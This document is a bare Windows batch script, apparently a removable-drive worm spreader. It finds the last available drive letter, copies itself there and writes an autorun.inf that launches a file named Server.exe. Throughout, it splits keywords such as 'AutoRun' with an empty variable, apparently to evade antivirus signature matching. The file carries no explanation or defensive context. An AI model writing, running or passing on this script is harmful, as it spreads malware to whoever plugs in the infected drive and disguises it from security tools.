@ECHO OFF
SET Drive=%NUL%
SET i=%NUL%
SET File=%0
SET SRV=Server.exe
FOR %%A in (A,B,C,D,E,F,G,H,I,J,K,L,M,N,O,P,Q,R,S,T,U,V,W,X,Y,Z) do (
	IF EXIST %%A:\ SET Drive="%%A"
)
COPY /Y %0 %Drive%:\
CD %Drive%:\
ECHO %i%[Au%i%to%i%R%i%un]%i% >> A%i%u%i%t%i%o%i%R%i%u%i%n%i%.%i%i%i%n%i%f
ECHO %i%O%i%p%i%e%i%n="%Drive%%i%:%i%\%i%%SRV%%i%" >> A%i%u%i%t%i%o%i%R%i%u%i%n%i%.%i%i%i%n%i%f
ECHO %i%A%i%c%i%t%i%i%i%on%i%=%i%w%i%w%i%w%i%.%i%g%i%i%i%t%i%h%i%u%i%b%i%.%i%c%i%o%i%m%i%/%i%e%i%q%i%u%i%i%i%n%i%0x%i%/%i%g%i%e%i%n%i% >> A%i%u%i%t%i%o%i%R%i%u%i%n%i%.%i%i%i%n%i%f
pause